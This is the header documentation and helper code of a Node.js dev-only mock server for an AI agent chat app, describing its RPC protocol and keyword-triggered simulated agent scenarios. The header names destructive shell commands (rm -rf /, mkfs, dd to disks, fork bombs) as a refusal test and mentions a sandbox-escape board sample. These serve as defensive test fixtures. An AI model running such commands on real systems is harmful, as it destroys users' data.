#!/usr/bin/env node
/**
 * Tessera mock server (dev only).
 *
 * A self-contained stand-in for `tessera serve` that speaks the real client
 * protocol (docs/PROTOCOL.md, crates/proto/src/lib.rs) with seeded in-memory
 * state and simulated agent turns. Node built-ins only.
 *
 *   node dev/mock-server.mjs                   # PORT=7878 HOST=127.0.0.1 (QUIET=1 hides RPC log)
 *   curl -X POST localhost:7878/__mock/drop    # close every WebSocket (?hard=1 destroys sockets)
 *   curl -X POST localhost:7878/__mock/reset   # restore seed state (?fresh=1: a first run, see Setup)
 *   curl -X POST localhost:7878/__mock/mosaics/touch   # another device edits the mosaics (…/mosaics/reset empties them)
 *   curl -X POST localhost:7878/__mock/steps-chat      # a Scout chat with two long runs of browser steps
 *   curl -X POST 'localhost:7878/__mock/provider-offline?id=local'   # a model server of the user's is off (&offline=0: back;
 *        &empty: it never listed a model): ProviderInfo.offline, providers_changed; a turn on one of its models warns
 *        "<name> isn't answering at <host:port> — retrying…", then fails with the engine's plain error
 *
 *   curl -X POST 'localhost:7878/__mock/model-window?id=local&model=gemma-4-12b&tokens=4096&server=ollama'
 *        # what a model server of the user's runs a model with (window.rs): ModelInfo.context_window, and
 *        # ModelInfo.context_warning in plain words when it is under 16,384 (&tokens=0 clears both; a model whose
 *        # server says nothing, not loaded and with no setting of its own, has neither), providers_changed
 *
 * Pairing: code 123456 (or 1234-5678 style 12345678) always works, plus codes minted by `create_pairing`.
 * Scenario keywords in a sent message (first match wins):
 *   stream · flood · subagent|subagents|parallel|delegate|research · nuke · demo · error|fail ·
 *   delete|approve|deploy|"rm " · edit|fix|refactor · test|run|build · long · (default)
 *   `stream` streams a long reply at a realistic pace (thinking → live tool output → long markdown) for testing
 *   the transcript's stick-to-bottom behaviour.
 *   `flood` is a scroll stress test: ~2000 lines in about 60–90 s over five steps, streamed fast (20–60 char
 *   deltas every 25–40 ms). Each step has 80–150 lines of thinking ("step 2 · thought 37: …"), 150–250 lines of
 *   markdown (numbered lines, a bullet list, a ~40-line code block, a table) and, in steps 1–4, 1–2 bash calls
 *   whose output streams 60–100 lines ("line 0042 · ok …") at 20–30 ms per line.
 * Models carry real per-model thinking lists (Qwen template-style, GPT-6, Claude Opus/Sonnet 5.5, Haiku budgets,
 * OpenRouter, and models without any); changing a chat's model snaps its thinking level like the real server.
 * A level picked in a chat (`update_session { thinking }`) is remembered for its model (ModelInfo.last_thinking,
 * providers_changed): new chats on that model, and chats switched to it, start there.
 * Voice: get_voice / save_voice / transcribe (returns canned text). Secrets: see "Passwords & keys" below.
 * Web search keys: `set_search_key { provider: "brave"|"tavily", key }` (write-only, "" removes; get_web_search lists
 * the set ones in `keys`). Usage: cloud models carry `cost_usd` (per entry and summed on the session); local ones don't.
 * Harness notes: user entries with `author: "harness"` ("[Completion check] …" in the SQLite chat, "[Harness restarted]
 * …" in "Investigate high memory"); the SQLite chat also has a model-fallback notice and verified done-when criteria.
 * Web search: get_web_search / save_web_search { search: "duckduckgo"|"searxng", searxng_url?, headers? } (seed
 * duckduckgo, no headers). searxng needs an http(s) URL; `searxng_url` comes back only while search is searxng;
 * omitted `headers` keeps the stored ones, {} clears them, and only the sorted names come back.
 * create_pairing also returns the key fingerprint and a `tessera://pair?…` link (for the QR code) built from
 * get_remote_access / set_remote_access (remote URLs + write-only proxy headers: `headers` replaces the set,
 * `remove_headers` / `add_headers` change single ones). set_server_bind { bind } → SetupStatus (bind,
 * restart_needed; the mock never really rebinds).
 *   `nuke` (e.g. "nuke everything") tries `rm -rf /`, which is refused in every permission mode, YOLO
 *   (`auto`) included, then explains why. Catastrophic bash commands (rm -rf / ~ /*, mkfs, dd of=/dev/sd*,
 *   fork bombs) are always refused before any approval prompt.
 *
 * Bots (seeded: Nova ✨ bot_nova01 · assistant, Forge 🔧 bot_forge1 · coding, YOLO, Scout 🔭 bot_scout1 · research):
 *   - Bot chats (`create_session { bot_id }`): every scenario above still works, authored by the bot, and
 *     the default answer is in the bot's voice. "ask|tell|message|ping @handle …" makes the bot call
 *     `message_bot`: the exchange runs in a read-only DM channel ("Nova → Forge", authored by both bots).
 *     From a bot chat or a plain chat it runs in the background (engine/handoffs.rs): the call returns at once
 *     with `details { bot, session_id, background: true }`, the DM's info carries `working_for { session_id,
 *     call_id, since, from_seq }` while the bot works, and its reply lands in the asking chat as a message from
 *     the bot ("[Reply from @forge · 12 s · session …]\n\n…"), after which the chat relays it. Stopping the
 *     DM (or the asking chat, or deleting it) stops the bot: its reply says so and the chat waits for the user.
 *     "… and wait" (or a room/DM/job) waits for the reply in the call, as before, and relays it. Pairs the sender's `can_message` does not allow get an error result
 *     (try "ask @scout …" in a Forge chat), as do bots with `askable: false` (they take work only from the
 *     user) and, for plain chats, `bot_handoff: "off"`; with "ask" a plain chat's hand-off waits for approval.
 *   - Rooms (`create_channel`): the @mentioned members reply in mention order, or every member when nobody
 *     is mentioned. A reply may @mention a member who hasn't spoken to hand it the floor (max 4 bot turns
 *     per user message). Sending to a DM channel is rejected: those are read-only.
 * Seeds: room "Launch planning", DM "Nova → Forge", bot chats "Plan my week" (Nova) and "Why is CI slow?"
 * (Forge), duties "Morning briefing" (Nova, with a last run) and "Weekly research digest" (Scout). There is
 * no Scout chat, so the UI shows a fresh greeting for it.
 *
 * Every SessionInfo carries `private` and `steps` (tool calls so far; seeds count their tool_call parts, live
 * turns bump it with a session_updated as each tool starts), and `fast` (false unless set).
 *
 * Fast mode: ModelInfo.fast is true for models of `openai_responses` / `openai_codex` providers (the seeded
 * "ChatGPT (Codex)" provider; sign it in with `complete_oauth { provider: "openai-codex", input: "…" }`).
 * `update_session { fast }` stores it as asked (like the engine, unsupported models just ignore it).
 *
 * Model roles: `get_model_roles` → ModelRoles { roles: [default, utility, memory, …the user's own] } with
 * `value` ("provider/model" or "@role") and `resolved` (memory → @utility → unset = the chat's own model;
 * default is the server's default model). `set_model_role { role, model? }` ("fast" = utility; no/empty model
 * clears) checks the model exists and refuses cycles (bad_request), broadcasts providers_changed and returns
 * ModelRoles. Setting `default` sets the default model.
 *
 * Small model mode (profiles.rs, engine/small.rs): every ModelInfo in `list_providers` has `small_mode` (left out
 * for "auto") and `small` (left out when false: new chats on it start in small model mode). Auto works it out like
 * the engine: never for Claude Code (not even "on"); on for a model on the user's own server (openai_chat at
 * localhost or a LAN address, not OpenRouter or api.openai.com) unless its size says large (dense over ~36B, a MoE
 * over ~12.5B active or ~125B in all), and on anywhere for a model known to be small (an id like qwen3-8b or
 * qwen3-30b-a3b, mistral-small…). Seeds: llama.cpp (desk)'s two models and OpenRouter's Mistral Small are on, the
 * rest off; Ollama and LM Studio from detect_local_models are on. `set_model_small { provider, model, mode }`
 * (empty names or a "/" in the provider → bad_request) keeps "on"/"off" per provider/model ("auto" removes it),
 * broadcasts providers_changed and returns null; /__mock/reset forgets it.
 *
 * Memory review: after a turn whose user message says "remember", an internal helper session (kind subagent,
 * `internal: true`, parent_id = the chat, title "Memory review") runs ~3.5 s, then the chat gets the usual
 * "Learned from this conversation" notice with one `learned` item. Clients must never list it as a subagent.
 *
 * Private chats (`create_session { private: true }`): kind chat, no bot, cwd = HOME, titled "Private chat"
 * until the first message (then titled from it locally). They can't be forked or archived (bad_request), never
 * show up in `search`, but are listed by `list_sessions` while the mock runs. Every message goes to a
 * private-safe scenario: a direct answer, or one `web_search { query }` call (3 fake results) and an answer;
 * no file, bash or edit tools. The answer always says nothing is saved.
 *
 * Rewind (engine/rewind.rs): `rewind { session_id, to_seq, files, conversation, dry_run }` → RewindResult. `to_seq` is the
 * last entry kept (moved back to before an assistant message whose tool results would be cut off). Files are read off
 * the history: each write/edit after `to_seq` is `restored`, or `deleted` when a `write` created the file (nothing read
 * or edited it before); a created file that a later shell command changed (it names the file with sed -i, rustfmt, >,
 * mv…, or runs cargo fmt) is `skipped` with the engine's reason, and a restored one gets a `notes` line. Every bash
 * command after `to_seq` is in `not_undone`. A conversation rewind first copies the full history to "<title>
 * (rewound)" (parent_id = the chat; session_updated), cuts the entries, then broadcasts `session_rewound { session_id,
 * to_seq }` and session_updated. Files only, or conversation only while files changed, adds the engine's "[Rewind] …"
 * harness note (entry_added). Files put back are not offered again. Refused: private chats and subagent sessions
 * (bad_request), a running turn, a compaction or background subagents (busy). Seeded "Add a /healthz endpoint" has all
 * of it: rewinding to before its second message restores router.rs (with a note), deletes tests/ready.rs, skips
 * src/ready.rs and lists two commands.
 *
 * Goals: `set_goal { session_id, goal }` (trimmed, ≤ 4000 chars, "" clears) sets `info.task.goal` (creating an
 * empty ledger if needed), broadcasts session_updated and returns the SessionInfo. It also adds a user entry
 * with `author: "goal"` ("[The user set the goal for this session]\n<goal>" / "[The user cleared the session
 * goal]"); while a turn runs the note is parked and injected at the next step instead (never in `queued`).
 *
 * Queue: `queued` (snapshot and queue_changed) is `{ text, steer, interrupt?, attachments }[]`: what is being sent
 * now (interrupt: true), the user's steers (steer: true), then follow-ups; `text` is all they typed (attachment
 * notes left out), `attachments` counts images and attached files. While
 * busy, `send` with delivery "auto" or "follow_up" queues a follow-up (run as the next turn once this one ends);
 * only "steer" is read at the next model step (injected as a user entry after a ~1 s pause so it visibly sits in
 * the queue; `stream` has three steps, so a steer typed during the first one waits several seconds). Rooms and
 * compaction queue everything as follow-ups. "interrupt" (send now) stops the turn: the message shows as
 * interrupt for ~0.4 s while the agent stops (its partial reply is kept, as with abort), then the next turn
 * starts with it; steers stay steers (read at its first step), follow-ups stay queued; a subagent is steered
 * instead; idle, it simply sends. Aborting moves what was being sent now, then un-injected steers, to the front
 * of the follow-ups (in that order). `index` below counts the items of `queued` (out of range → not_found):
 *   - `dequeue { session_id, index }` removes one;
 *   - `edit_queued { session_id, index, text }` changes its text (images and attached files stay);
 *   - `steer_queued { session_id, index }` moves a follow-up to the end of the steers (read at the next step;
 *     with no turn running it just goes first). A steer stays as it is;
 *   - `interrupt_queued { session_id, index }` sends it now, as delivery "interrupt".
 *
 * Whiteboards (engine/boards.rs): `list_boards { session_id? }`, `get_board { id }`, `delete_board { id }`
 * (also drops its tiles, bumping the mosaic version, and cancels its ask), `answer_board { id, ask_id, answer }`
 * (checked like the engine: a signature must be a PNG ≤ 2 MB, a choice in range…; every accepted answer is
 * listed by GET /__mock/boards), `board_link { id }` → `{ path: "/board/<id>/<token>/" }` (HTML boards only).
 * The page is served with proto::board's CSP header, `X-Frame-Options: SAMEORIGIN`, the injected import map
 * and `--tessera-*` colours (`?theme=light`); `/board-lib/{three.module.js, three-addons/…, d3.js}` come from
 * the repo's assets/board-lib with `Access-Control-Allow-Origin: *`. Showing a board broadcasts board_updated
 * and puts a board tile right after the chat's tile (or at the end of the first mosaic, or in a new "Main"
 * mosaic) — for an agent only with `open: true` (asked for) or an ask on that board; a plain ask stays in the
 * chat. An ask sets the session to `awaiting_approval` until it is answered. Scenario keywords
 * (whiteboard|board|visualize|diagram|topology|sign|signature) make the agent call the `whiteboard` tool with
 * `open: true` ("sketch|illustrate": without, a card only) (result
 * `details: { board: { id, title, kind } }`); the rest of the message picks the sample: chart|d3 · markdown|notes
 * · image · url|website · kasm|remote desktop · local|web app (a dev server on PORT+100, or LOCAL_APP_PORT) · sign|signature (an
 * application to sign) · choose|pick · confirm · "ask me" (text) · evil|escape|attack (tries to break out of
 * its sandbox) · otherwise a Three.js network topology. `POST /__mock/board { session_id?, kind?, title?,
 * content?, ask?: {prompt, input} | false, id?, place?: "first" }` shows one without a turn (latest chat by default;
 * `place: "first"` puts its tile at the end of the first mosaic, as if the chat's tile weren't shared yet).
 * `GET /__mock/sends` lists each `send` with whether the chat's tile was in the shared layout by then.
 * `create_board { session_id, title, content, placed? }` → Whiteboard: the user shows something beside a chat (same
 * checks and tile placement as the tool, none when `placed`; refused in private chats and bot DMs); it has
 * `by_user: true` (agent boards `by_user: false`).
 * Seeded "Explain my home network" has a whiteboard call and its board. Learned notices: "Plan my week" ends
 * with a notice carrying `learned` items; "Fix flaky websocket reconnect test" has an old text-only one.
 *
 * Note pictures: `put_note_asset { mime, data }` → NoteAsset (name `<16 hex>.<ext>` from the bytes; PNG/JPEG/GIF/WebP by
 * their bytes, ≤ 8 MB), `read_note_asset { name, offset?, len? }` → FileChunk; `note_backlinks { id }` → the NoteInfo[]
 * of notes whose text has `[[its title]]` (any case) or `[[its id]]`.
 * Notes: `list_notes` → NoteInfo[] (newest first), `get_note { id }`, `save_note { title, content, id?,
 * base_version?, session_id? }` → Note (no id creates one, `by_user: true`; a stale `base_version` is a conflict
 * error naming the current version, unless the note already says exactly that: then it is returned unchanged,
 * no new version, no event; content ≤ 200 KB), `delete_note { id }` (also drops its tiles), `set_note_agents { id,
 * keep_from_agents }` → Note (keep it from agents and bots, or not: every note is theirs to read by default; same
 * version, broadcast as note_updated); older apps' `set_note_bots { id, all_bots }` is the same with
 * `keep_from_agents: !all_bots`, and `all_bots` is always `!keep_from_agents`. Each change
 * broadcasts note_updated { note: NoteInfo } / note_removed { id }. Agents' changes set `agent_edit: true` and
 * `edit_session`. `note_history { id }` → NoteVersion[] (kept before a change: when the writer switches between
 * the user and an agent, else once per 10 minutes; newest first, no content), `get_note_version { id, version }`.
 * `preview_page { html }` → `{ path: "/preview/<token>/" }`, served like a board page. `mock_agent_edit { id,
 * content? | find+replace | append }` changes a note as an agent; `mock_note_latency { ms }` slows get_note /
 * save_note answers (the broadcast still goes out at once, as on a slow phone link). Mosaic tiles may carry `note_id`. Scenario
 * keywords "write/make/take/jot (me) (a) note(s)" or "note this/that/it down" make the agent call the `note`
 * tool (create: a card in the chat, `details.note`; with "show"/"open" in the message also `show: true`, a note
 * tile beside the chat).
 * Snapshots: `board_snapshot { request_id, image?, error? }` answers a `board_snapshot_request { request_id,
 * board_id }` event; scenario keywords "look at|what do you see|can you see" make the agent call `whiteboard { action:
 * "look" }` on the chat's latest board, which broadcasts the request and waits up to 10 s for the first image
 * (`GET /__mock/snapshots` lists the images received).
 * Remote browser (contract 3): `browser_attach { board_id, width, height, dpr, mobile }` → BrowserTab, then
 * `browser_frame` events (a drawn PNG of a pretend page) only to attached connections, the next one only after
 * `browser_ack { board_id, frame }`; `browser_detach`, `browser_input { board_id, event }` (mouse/touch/key/text,
 * logged and acted on: the link at y 80–120 navigates, the field at y 140–184 takes focus → `browser_focus` (a
 * password field on a page whose address says "password", email for "email"), the
 * button at y 200–240 asks → `browser_dialog`, wheel/drag scroll), `browser_nav { board_id, action }`
 * (go/back/forward/reload/stop/zoom → BrowserTab, `browser_state` broadcast; the board's url follows without a
 * new version), `browser_dialog_answer`. `GET /__mock/browser` → { tabs, attached, log, frames, acks };
 * `POST /__mock/browser/reset` clears the log. "go to example.com" / "open … in the browser" makes the agent use
 * the `browser` tool in a background tab (no tile; see AGENT-TILES below: "show me …" shows it, "sign in to …"
 * hands it over). `whiteboard look` on a web view uses the tab's picture directly.
 * Subagents switch: `update_session { subagents: false }` stores it (SessionInfo.subagents absent = on); while off,
 * the subagent keywords get a plain answer saying it works alone instead of starting the `agent` tool.
 *
 * Subagents: keywords subagent|subagents|parallel|delegate|research start the `agent` tool with 2–3 read-only
 * tasks (`{ tasks: [{ name, prompt, readonly }], wait }`; 2 tasks when the message says "two"/"2"). Background by
 * default; "wait" or "foreground" in the message sets `wait: true`. Each task gets a child session (kind
 * subagent, parent_id, title "↳ <name>", the parent's model and privacy, read_only) that runs its own turn
 * (read/grep/bash steps, 10–25 s) and ends with a markdown report. Background: the tool returns at once, and each
 * report lands on the parent as a user entry with `author: "subagent:<child id>"` and the header
 * `[Report from subagent "<name>" · <steps> steps · <took> · session <child id>]`; once the whole batch is in and
 * the parent is idle, the parent summarises them. Foreground: the call streams "Running N subagent(s): …" and
 * completes with `## <name> (session <id>)\n<report>` sections. Aborting a child stops it (its report says it
 * did not finish); aborting the parent stops its foreground and background subagents, like the engine.
 * Subagent sessions are excluded from `list_sessions` but work with `get_session`.
 * Seeded "Audit the reconnect logic" (today) shows a finished background run: two child sessions, their reports
 * and a final summary.
 * Helper limits (engine/helper_limits.rs): each chat runs at most its own number of helpers at once
 * (`info.helper_limits.at_once`, 0 = no limit) or else the default 4 (`agent.max_subagents`), and the server at
 * most HELPER_CAPACITY across all chats. `get_helpers` → HelperSettings { at_once, default, max: 4294967295, steps,
 * minutes, capacity }; `set_helpers { at_once, steps?, minutes? }` (0–4294967295; 0 = no limit) → HelperSettings;
 * `set_chat_helpers { session_id, limits }` (each 0–4294967295; an empty set clears it; refused for a helper) →
 * SessionInfo. Used at once. Extra children are created at once (prompt entry, status running,
 * `helper_queued: true`: "waiting for a slot") and start, in order per chat, as there is room. Aborting or
 * deleting a waiting child, or aborting its parent, stops it before it starts (its report says it did not finish).
 *
 * Swarm: keywords swarm|fan out|30 subagents start `agent` with 32 read-only tasks ("Audit crate: tessera-core",
 * "Audit module: core/engine.rs", "Check endpoint /api/pair", "Check RPC: send", …), `wait: false`. 4 run at a time;
 * each takes 2–4 tool steps over 4–9 s and reports 3–6 lines (same `[Report from subagent …]` header); once all
 * 32 are in, the parent summarises (counts per verdict, what needs attention). Seeded "Audit every crate" (today)
 * is a finished run with 24 children and 24 reports, to render a big group without waiting.
 *
 * Setup: `setup_status` → SetupStatus { completed, has_model (a default model whose provider is authenticated),
 * default_model?, web_search, voice, remote (any remote URL), devices (paired, minus names starting
 * "Terminal (this machine)"), sandbox "on (namespaces + Landlock)", server_name, lan (false) }. Seeds are completed;
 * `complete_setup` → null marks it done. `POST /__mock/reset?fresh=1` resets like /__mock/reset but not completed,
 * with no default model and no authenticated provider (API keys dropped, entries kept), so the wizard starts empty.
 * `detect_local_models` (~1.2 s) → ProviderInfo[]: adds "Ollama (this computer)" (id ollama, openai_chat,
 * http://127.0.0.1:11434/v1, auth none, qwen3:8b + gemma3:4b) and, like the engine's look at the home network,
 * "LM Studio on 192.168.1.42:1234" (id lm-studio-42, one model) if missing, and broadcasts providers_changed. It never
 * picks a default model: `has_model` turns true only after `set_default_model`.
 * Claude Code (CLAUDE-CODE block): `claude_code_status { refresh }` → ClaudeCodeInfo for the mock's state, "missing"
 * by default; `POST /__mock/claude-code?state=ready|signed_out|api_key|missing` sets it and adds (or removes) the
 * `claude-code` provider ("Claude (your subscription)", kind claude_code, auth oauth, opus/sonnet/haiku), then
 * broadcasts providers_changed.
 *
 * Cloudflare: `cloudflare_zones { token }` (~600 ms) → [example.com, myhome.dev] as CloudflareZone; an empty token
 * or one containing "bad" → bad_request. `cloudflare_setup { token, zone_id, hostname }` (hostname must be on the
 * zone) sends `setup_progress { task: "cloudflare", step, done }` for 7 steps, ~700 ms each (done: false, then
 * done: true): Checking the token · Creating the tunnel · Adding the DNS record <hostname> · Protecting it with
 * Cloudflare Access · Creating a service token for your devices · Starting cloudflared · Checking it answers. Then
 * it adds https://<hostname> and the CF-Access-Client-Id/-Secret headers to the remote-access state (so
 * get_remote_access and pairing links show them) and returns RemoteStatus { lan_urls, urls, header_names,
 * tunnel: { hostname, tunnel_id, running: true, connected: true, key_expires_at: now + a year (seconds) } }. A
 * hostname containing "fail" ends step 5 with the engine's Zero Trust words (`CF_FAIL`, remote.rs ZERO_TRUST_HELP)
 * and rejects with that bad_request (nothing kept). Zero Trust: `cloudflare_zones` marks every zone `zero_trust:
 * false` for a token containing "nozt" (else true), and `cloudflare_setup` with such a token fails at its first step
 * with the same words. `cloudflare_remove { token }` (Stopping cloudflared · Deleting the tunnel and DNS record ·
 * Removing the Access app) drops the tunnel, its URL and the two headers. Setup, removal, `set_remote_access` and
 * `mock_tunnel` adding or removing one broadcast `server_route_changed`. `cloudflare_renew { token? }` (no tunnel:
 * bad_request; a "bad" token: rejected; a token containing "gone": "Cloudflare no longer has the key…"; none: the
 * user renewed it in Cloudflare) sets `key_expires_at` to now + a year and returns RemoteStatus. `get_server_route`
 * is refused (`unauthorized`): only the apps' encrypted connections get it, and the mock's are plain browser ones.
 * `retire_login { token }` signs out the device of that token (its user-given name carries over to the caller);
 * an unknown token is fine, the caller's own refused. `remote_status` → RemoteStatus (`lan_urls` stays [] while
 * the mock is not on the LAN). The API token is never stored.
 *
 * Web access ("Use Tessera in a web browser", engine/web_access.rs): `remote_status().web` = { on, available,
 * url (first https address + "/web/"), needs_token (a Tessera tunnel without its /web door yet), browsers }.
 * `set_web_access { on, token? }`: turning on with `needs_token` needs a token (`checkCfToken`; "bad" fails;
 * without one: bad_request "Cloudflare lets only the Tessera apps reach this server; …"), which opens the door
 * once (`needs_token` false from then on); off closes paired browsers (list_devices `browser: true`). Seeded:
 * off, available, no browsers (`mock_web_access { available, browsers }` changes it for tests).
 *
 * Mosaics: `get_mosaics` → MosaicLayout { version, mosaics } (seed { version: 0, mosaics: [] }). `save_mosaics
 * { layout }` needs `layout.version` = the current version (else `conflict`), drops tiles of private chats, keeps
 * `geometry` opaque, stores it as version + 1, broadcasts `mosaics_changed { layout }` and returns it.
 * `POST /__mock/mosaics/touch` plays another device (version + 1; renames the first mosaic "<name> ·", or adds
 * one with a tile for a recent chat when there is none); `POST /__mock/mosaics/reset` empties it. Both broadcast.
 *
 * Passwords & keys (auth.rs): `list_secrets` → SecretInfo { name, updated_at, kind: token|login|custom,
 * description, fields (sorted names; [] for tokens), ask, hosts, last_used?, bots? (absent: any chat; ids: only
 * those bots), on_server, on_machines, machines_default (its machines follow get_security's `secret_machines`
 * instead of on_machines: absent in the store = it named no machines), chat? (kept for that chat alone: see
 * APP-SETTINGS) }. Seeds: GITHUB (login: username, password, totp; ask; github.com; used 2 h
 * ago), OPENWEATHER_KEY (token, no ask, never used), STRIPE_TEST (custom: api_key, webhook_secret), SWITCH_ADMIN
 * (login, only Forge, only on Desktop). `save_secret { name, kind, description, fields, remove_fields, ask, hosts,
 * bots?, on_server?, on_machines?, new_name? }` → SecretInfo: empty field values keep the stored ones,
 * remove_fields drops fields, a token's `value` field becomes its value, `totp` must be a base32 seed, hosts lose
 * http(s):// and a trailing /; bots/on_server/on_machines left out keep what is set (`bots: null` = any chat);
 * `new_name` renames it (taken → bad_request); `machines_default` true/false switches between following the
 * setting and its own machines (left out: kept, but naming machines makes them its own). `set_secret_title
 * { name, title }` → SecretInfo changes only the title; `suggest_secret_titles` → [{ name, title, suggested }]
 * for titles that say little ("saved from a chat"), from the name, kind, sites and machine names. No reply ever holds a value. `set_secret` / `delete_secret`
 * still work. `mock_secret_check { name, field?, value }` → whether the stored value equals `value` (tests). A bash call naming a secret's variables ($OPENWEATHER_KEY, $GITHUB_PASSWORD, $GITHUB_OTP, …) marks
 * it used; a message that mentions one ("check $GITHUB_PASSWORD still works") runs a curl with it, behind an
 * approval when the secret has `ask` (not in auto mode).
 * Security and pricing (APP-SETTINGS block): `get_security` / `set_security` (SecurityInfo, with
 * `secret_machines` off|picked|all, `secret_machines_picked` (known machine ids only; a revoked machine leaves
 * it) and `bot_handoff` on|ask|off; `mock_security` plays another kernel, or a Windows server with `windows: true`), `get_usage` with API prices, billing, unpriced models and subscriptions
 * (days are the asking device's by its `utc_offsets`; `POST /__mock/usage-row { ts }` adds a request at an exact instant),
 * `set_subscription`, `set_model_price`, each subscription's `limits` (ChatGPT: 5-hour 42%, weekly 18%;
 * `mock_plan_limits { provider, limits }` sets them); known key formats in `send` become secrets (`$NAME` in the message, the
 * server's "Saved to Passwords & keys: …" notice); `mock_secret_notice` saves a login the way the agent's tool
 * does (`entries_changed`).
 *
 * Attachments: `send { attachments: [{ name, mime, data (base64) }] }` (missing = []) mirrors engine attach():
 * ≤ 10 files, 25 MB each, 50 MB per message; png/jpeg/gif/webp become image parts; other files are "saved" at
 * ~/.cache/tessera/uploads/<session>/<name> (deduped "name (1).ext") and become a text part
 * `[Attached file: <name> · <size> · saved at <path>]` plus the text in a fence (UTF-8 without NUL, ≤ 64 KB), a
 * "Large text file" or a "Binary file" hint. Private chats inline text (≤ 256 KB) and images only. Parts follow
 * the user's own content; the default (and private) answer names the files.
 */
import http from 'node:http';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import zlib from 'node:zlib';
import { helperDisplayFixture } from './helper-display-fixture.mjs';
import { recallLazyFixture } from './recall-lazy-fixture.mjs';
import { claudeNative27Fixture } from './claude-native27-fixture.mjs';
import { uiBusyFixture } from './ui-busy-fixture.mjs';
import { transcriptPerfFixture } from './transcript-perf-fixture.mjs';

const PORT = Number(process.env.PORT) || 7878;
const HOST = process.env.HOST || '127.0.0.1';
const QUIET = process.env.QUIET === '1';
const DIST_DIR = fileURLToPath(new URL('../dist/', import.meta.url));
const HOME = '/home/user';
const VERSION = '0.1.0-mock';
const WS_GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11';
const MAX_MESSAGE = 64 * 1024 * 1024; // like the real server (attachments are up to 50 MB per message)
const BASE_CONTEXT = 3184; // system prompt + tool schemas

// ─── helpers ────────────────────────────────────────────────────────────────
const MIN = 60_000, HOUR = 60 * MIN, DAY = 24 * HOUR;
const now = () => Date.now();
const hex = (bytes = 6) => crypto.randomBytes(bytes).toString('hex');
const randInt = (lo, hi) => lo + Math.floor(Math.random() * (hi - lo + 1));
const clone = (v) => structuredClone(v);
const tok = (s) => Math.ceil(String(s ?? '').length / 4);
const truncate = (s, n) => (s.length > n ? s.slice(0, n - 1).trimEnd() + '…' : s);
/** First non-empty line, trimmed and truncated (core::util::one_line). */
const oneLine = (s, n) => truncate(String(s ?? '').split('\n').map((l) => l.trim()).find(Boolean) ?? '', n);
const log = (...a) => console.log(`[mock ${new Date().toTimeString().slice(0, 8)}]`, ...a);
const hashStr = (s) => [...String(s)].reduce((h, c) => (h * 31 + c.codePointAt(0)) >>> 0, 7);
const uniq = (arr) => [...new Set(arr)];
/** Markdown template tag: `~~~` becomes a ``` fence and one leading newline is dropped. */
const md = (strs, ...vals) =>
  strs.reduce((acc, s, i) => acc + s + (i < vals.length ? vals[i] : ''), '').replaceAll('~~~', '```').replace(/^\n/, '');

class RpcError extends Error {
  constructor(code, message) { super(message); this.code = code; }
}
const badRequest = (m) => new RpcError('bad_request', m);
const notFound = (m) => new RpcError('not_found', m);
function need(p, key) {
  const v = p?.[key];
  if (v === undefined || v === null) throw badRequest(`missing field \`${key}\``);
  return v;
}
const oneOf = (v, allowed, what) => {
  if (!allowed.includes(v)) throw badRequest(`unknown ${what} \`${v}\``);
  return v;
};
const expandHome = (p) => (p === '~' || p.startsWith('~/') ? HOME + p.slice(1) : p);

const textOf = (parts) => (parts || []).filter((p) => p?.type === 'text').map((p) => p.text).join('\n');
const ATTACHED_RE = /^\[Attached file: /;
/** What the user typed, without the `[Attached file: …]` parts `send` appends for attachments. */
const ownText = (parts) => textOf((parts || []).filter((p) => !(p?.type === 'text' && ATTACHED_RE.test(p.text))));
const entryText = (e) => (e.kind === 'user' || e.kind === 'assistant' ? textOf(e.content) : '');
const stripMarkdown = (t) => t
  .replace(/```[\s\S]*?(```|$)/g, ' ')
  .replace(/\[([^\]]*)\]\([^)]*\)/g, '$1')
  .replace(/^\s*(#{1,6}|[-*+]|\d+\.|>)\s+/gm, '')
  .replace(/[*_`|]/g, '')
  .replace(/\s+/g, ' ')
  .trim();

function computePreview(entries) {
  for (let i = entries.length - 1; i >= 0; i--) {
    const t = stripMarkdown(entryText(entries[i]));
    if (t) return truncate(t, 140);
  }
  return '';
}
function titleFrom(text) {
  const words = stripMarkdown(text).split(/\s+/).filter(Boolean);
  const t = words.slice(0, 6).join(' ') + (words.length > 6 ? '…' : '');
  return truncate(t, 60) || 'New session';
}
function entryTokens(e) {
  switch (e.kind) {
    case 'user': return tok(textOf(e.content)) + 8;
    case 'tool_result': return tok(textOf(e.content)) + 10;
    case 'assistant':
      return e.content.reduce((n, p) => n + tok(p.type === 'tool_call' ? JSON.stringify(p.arguments) : p.text), 12);
    default: return 0;
  }
}
const zeroUsage = () => ({ input: 0, output: 0, cache_read: 0, cache_write: 0 });
function addUsage(into, u) {
  for (const k of ['input', 'output', 'cache_read', 'cache_write']) into[k] += u[k] || 0;
  // Cost is optional: only known-price models have it (local models never do).
  if (typeof u.cost_usd === 'number') into.cost_usd = Math.round(((into.cost_usd ?? 0) + u.cost_usd) * 1e6) / 1e6;
  return into;
}
// Like engine/usage.rs: Tessera-run bridged helpers contribute to their
// chat's counter. Claude Code's own Agent is already in its parent's usage.
function addSessionUsage(rec, usage) {
  addUsage(rec.info.usage, usage);
  const parent = rec.bridgedHelper && state.sessions.get(rec.info.parent_id);
  if (parent) { addUsage(parent.info.usage, usage); emitSession(parent); }
}
/** $ per million tokens (input, output, cache read, cache write) for the cloud providers; local models: none. */
const PRICES = { anthropic: [3, 15, 0.3, 3.75], 'openai-codex': [1.25, 10, 0.125, 0], openai: [1.25, 10, 0.125, 0], openrouter: [0.8, 4, 0.08, 0] };
function stepUsage(ctxTokens, outTokens, model) {
  const cached = Math.max(0, ctxTokens - randInt(300, 1500));
  const u = { input: Math.max(40, ctxTokens - cached), output: outTokens, cache_read: cached, cache_write: randInt(150, 1200) };
  const price = PRICES[model?.provider];
  if (price) u.cost_usd = Math.round(((u.input * price[0] + u.output * price[1] + u.cache_read * price[2] + u.cache_write * price[3]) / 1e6) * 1e6) / 1e6;
  return u;
}
function recalc(entries, window) {
  const usage = zeroUsage();
  let tokens = BASE_CONTEXT, compactions = 0;
  for (const e of entries) {
    if (e.kind === 'compaction') { tokens = e.tokens_after; compactions++; continue; }
    if (e.kind === 'assistant' && e.usage) addUsage(usage, e.usage);
    tokens += entryTokens(e);
  }
  return {
    usage,
    context: { tokens: Math.min(tokens, window), window, compactions },
    last_seq: entries.at(-1)?.seq ?? 0,
    preview: computePreview(entries),
  };
}
function windowFor(ref, providers = state.providers) {
  const m = providers.find((p) => p.id === ref?.provider)?.models.find((x) => x.id === ref?.model);
